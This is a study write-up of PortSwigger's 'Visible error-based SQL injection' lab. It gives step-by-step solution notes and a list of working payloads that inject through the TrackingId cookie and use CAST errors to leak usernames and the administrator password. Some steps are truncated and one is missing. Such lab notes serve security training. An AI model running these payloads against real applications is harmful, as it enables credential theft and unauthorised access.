# Lab: Visible error-based SQL injection

**Official lab:** [Lab: Visible error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)

## Lab idea

Practices interpreting informative database error behavior as an information-disclosure channel in a SQLi context where query results are otherwise not shown.

## Vulnerability in brief
SQL injection (SQLi) is a web vulnerability in which untrusted input changes the meaning of a SQL query made by an application. It commonly occurs when an application builds a query by concatenating user-controlled values into SQL instead of keeping query structure separate from data. Inputs may arrive through form fields, URL parameters, cookies, headers, or other request data. Injection can occur in different query types and positions, not only in a `SELECT` statement's `WHERE` clause.

## Solution idea
1. Using Burp's built-in browser, explore the lab functionality.
2. Go to the Proxy > HTTP history tab and find a GET / request that contains a TrackingId cookie.
3. In Repeater, append a single quote to the value of your TrackingId cookie and send the request.
4. In the response, notice the verbose error message.
- …
6. Modify the query to return only one row: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
7. Now that you know that the administrator is the first user in the table, modify the query once again to leak their password: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS…
8. Log in as administrator using the stolen password to solve the lab.

## Payloads / key values
- `GET /`
- `TrackingId`
- `TrackingId=ogAZZfxtOKUELbuJ'`
- `TrackingId=ogAZZfxtOKUELbuJ'--`
- `SELECT`
- `int`
- `TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--`
- `AND`
- `=`
- `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--`
- `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--`
- `TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--`
- `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
- `users`
- `ERROR: invalid input syntax for type integer: "administrator"`
- `administrator`
- `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

## Official source
- [PortSwigger Academy: Lab: Visible error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)
